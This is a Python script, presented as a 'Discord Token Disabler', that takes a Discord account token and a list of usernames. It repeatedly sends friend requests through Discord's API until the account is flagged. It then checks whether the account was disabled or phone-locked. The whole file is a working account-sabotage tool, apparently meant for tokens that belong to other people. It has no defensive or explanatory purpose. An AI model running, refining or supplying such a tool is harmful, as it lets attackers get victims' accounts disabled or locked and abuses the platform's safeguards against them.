import pyfiglet
import requests
from console.utils import set_title

def send_friend_request(token, user):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    data = {
        "username": str(user.split("#")[0]),
        "discriminator": int(user.split("#")[1])
    }
    response = requests.post("https://discord.com/api/v9/users/@me/relationships", headers=headers, json=data)
    if response.status_code == 200:
        return None
    elif response.status_code == 401:
        return "Disabled"
    elif response.status_code == 403:
        return "Locked"
    else:
        return "Unknown"

def check_token(token):
    headers = {
        "Authorization": token
    }
    response = requests.get("https://discord.com/api/v9/users/@me/library", headers=headers)
    if response.status_code == 200:
        return "Alive"
    elif response.status_code == 401:
        return "Invalid"
    elif response.status_code == 403:
        return "Valid"
    else:
        return "Unknown"

def disabler(token, users):
    for user in users:
        response = send_friend_request(token, user)
        if response == "Disabled" or response == "Locked":
            break
    response = check_token(token)
    if response == "Alive":
        print("Token deactivation failed. It is still available and the account is not disabled.")
    elif response == "Valid":
        print("Token Lock succeeded. You are required to authenticate your phone number, and you will not be able to continue using your account unless you do so.")
    elif response == "Invalid":
        print("Token deactivation succeeded.")
    else:
        print("I do not know the status of Token from here.")

def main():
    set_title("Discord Token Disabler | Status: Idle")
    print(pyfiglet.figlet_format("Token Disabler"))
    token = input("Token >> ")
    if check_token(token) != "Alive":
        print("This Token has already been disabled or locked.")
        return
    with open("users.txt", "r", encoding="utf-8") as file:
        users = file.read().split("\n")
    if int(len(users)) <= 2:
        print("Invalidating a token requires at least three usernames.")
        return
    set_title("Discord Token Disabler | Status: In progress")
    print("Token deactivation is in progress.")
    disabler(token, users)
    set_title("Discord Token Disabler | Status: end")

if __name__ == "__main__":
    main()